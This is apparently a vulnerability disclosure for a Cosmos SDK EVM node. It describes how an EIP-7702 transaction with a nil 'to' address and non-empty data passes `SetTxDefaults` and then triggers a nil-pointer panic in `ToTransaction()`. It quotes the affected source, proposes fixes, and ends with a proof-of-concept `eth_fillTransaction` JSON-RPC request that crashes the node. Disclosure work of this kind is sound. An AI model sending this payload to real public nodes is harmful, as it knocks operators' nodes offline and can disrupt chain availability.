### Title
Nil-Pointer Dereference Panic in `ToTransaction` SetCodeTx Branch via `eth_fillTransaction`/`eth_resend` — (`x/evm/types/tx_args.go`)

### Summary

`ToTransaction()` unconditionally dereferences `args.To` at line 93 in the `SetCodeTx` branch. `SetTxDefaults` only rejects `args.To == nil` when no calldata is provided. When `AuthorizationList != nil` (triggering the SetCodeTx branch) and `args.To == nil` but `args.Data != nil`, `SetTxDefaults` returns successfully, and the subsequent `ToTransaction()` call panics with a nil-pointer dereference, crashing the node.

### Finding Description

In `ToTransaction()`, the `SetCodeTx` branch directly dereferences `args.To` without a nil guard: [1](#0-0) 

```go
case args.AuthorizationList != nil:
    ...
    data = &types.SetCodeTx{
        To:      *args.To,   // ← unconditional dereference
        ChainID: uint256.MustFromBig(args.ChainID.ToInt()),
        Nonce:   uint64(*args.Nonce),
        Gas:     uint64(*args.Gas),
        ...
    }
```

`SetTxDefaults` guards `args.To == nil` only when no calldata is present: [2](#0-1) 

```go
if args.To == nil {
    ...
    if len(input) == 0 {
        return args, errors.New("contract creation without any data provided")
    }
    // ← no error if data is non-empty; args.To stays nil
}
```

When `AuthorizationList != nil` and `args.To == nil` and `args.Data != nil`, `SetTxDefaults` passes without error. `args.To` is never populated. `ToTransaction()` then panics at `*args.To`.

The other pointer dereferences in the same branch (`*args.Nonce`, `*args.Gas`) are protected because `SetTxDefaults` always populates them or returns an error first. `uint256.MustFromBig(nil)` is safe (returns zero). The sole exploitable panic is `*args.To`.

### Impact Explanation

A Go `nil` pointer dereference is an unrecovered panic. In a Cosmos SDK node, an unrecovered panic in the RPC goroutine crashes the process. This constitutes a **chain halt via node crash** — a Critical impact under the allowed scope.

### Likelihood Explanation

The vulnerability is reachable through two **fully unprivileged** public JSON-RPC endpoints that do not require the caller's key to be in the node keyring:

**`eth_fillTransaction`** — calls `SetTxDefaults` then `ToTransaction()` with no authentication: [3](#0-2) 

**`eth_resend`** — same pattern, only requires `Nonce != nil`: [4](#0-3) 

`eth_sendTransaction` is also affected but requires the `from` key to be in the node keyring: [5](#0-4) 

Any internet-accessible node with EIP-7702 enabled is exploitable by a single crafted RPC call.

### Recommendation

Add an explicit guard in `ToTransaction()` for the `SetCodeTx` branch, or add a guard in `SetTxDefaults` that rejects `args.To == nil` when `args.AuthorizationList != nil` (EIP-7702 SetCodeTx semantically requires a `To` address):

```go
// In SetTxDefaults, before the existing args.To == nil block:
if args.To == nil && args.AuthorizationList != nil {
    return args, errors.New("SetCode (EIP-7702) transaction requires a 'to' address")
}
```

Or defensively in `ToTransaction()`:

```go
case args.AuthorizationList != nil:
    if args.To == nil {
        return nil  // or panic with a descriptive message caught by recover
    }
    to := *args.To
    ...
```

### Proof of Concept

```
POST / HTTP/1.1
Content-Type: application/json

{
  "jsonrpc":"2.0","method":"eth_fillTransaction","id":1,
  "params":[{
    "from":       "0x<any address>",
    "to":         null,
    "gas":        "0x5208",
    "maxFeePerGas":        "0x1",
    "maxPriorityFeePerGas":"0x1",
    "nonce":      "0x0",
    "data":       "0xdeadbeef",
    "authorizationList": [{}]
  }]
}
```

`SetTxDefaults` returns successfully (data is non-empty, so the `To == nil` check does not error). `ToTransaction()` enters the `AuthorizationList != nil` branch and panics at `*args.To` (nil dereference). The node process crashes. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** x/evm/types/tx_args.go (L87-103)
```go
	case args.AuthorizationList != nil:
		al := types.AccessList{}
		if args.AccessList != nil {
			al = *args.AccessList
		}
		data = &types.SetCodeTx{
			To:         *args.To,
			ChainID:    uint256.MustFromBig(args.ChainID.ToInt()),
			Nonce:      uint64(*args.Nonce),
			Gas:        uint64(*args.Gas),
			GasFeeCap:  uint256.MustFromBig((*big.Int)(args.MaxFeePerGas)),
			GasTipCap:  uint256.MustFromBig((*big.Int)(args.MaxPriorityFeePerGas)),
			Value:      uint256.MustFromBig((*big.Int)(args.Value)),
			Data:       args.GetData(),
			AccessList: al,
			AuthList:   args.AuthorizationList,
		}
```

**File:** rpc/backend/call_tx.go (L42-66)
```go
func (b *Backend) Resend(args evmtypes.TransactionArgs, gasPrice *hexutil.Big, gasLimit *hexutil.Uint64) (common.Hash, error) {
	if args.Nonce == nil {
		return common.Hash{}, fmt.Errorf("missing transaction nonce in transaction spec")
	}

	args, err := b.SetTxDefaults(args)
	if err != nil {
		return common.Hash{}, err
	}

	// The signer used should always be the 'latest' known one because we expect
	// signers to be backwards-compatible with old transactions.
	eip155ChainID, err := ethermint.ParseChainID(b.clientCtx.ChainID)
	if err != nil {
		return common.Hash{}, err
	}

	cfg := b.ChainConfig()
	if cfg == nil {
		cfg = evmtypes.DefaultChainConfig().EthereumConfig(eip155ChainID)
	}

	signer := ethtypes.LatestSigner(cfg)

	matchTx := args.ToTransaction().AsTransaction()
```

**File:** rpc/backend/call_tx.go (L294-306)
```go
	if args.To == nil {
		// Contract creation
		var input []byte
		if args.Data != nil {
			input = *args.Data
		} else if args.Input != nil {
			input = *args.Input
		}

		if len(input) == 0 {
			return args, errors.New("contract creation without any data provided")
		}
	}
```

**File:** rpc/namespaces/ethereum/eth/api.go (L510-529)
```go
func (e *PublicAPI) FillTransaction(args evmtypes.TransactionArgs) (*rpctypes.SignTransactionResult, error) {
	// Set some sanity defaults and terminate on failure
	args, err := e.backend.SetTxDefaults(args)
	if err != nil {
		return nil, err
	}

	// Assemble the transaction and obtain rlp
	tx := args.ToTransaction().AsTransaction()

	data, err := tx.MarshalBinary()
	if err != nil {
		return nil, err
	}

	return &rpctypes.SignTransactionResult{
		Raw: data,
		Tx:  tx,
	}, nil
}
```

**File:** rpc/backend/sign_tx.go (L50-55)
```go
	args, err = b.SetTxDefaults(args)
	if err != nil {
		return common.Hash{}, err
	}

	msg := args.ToTransaction()
```
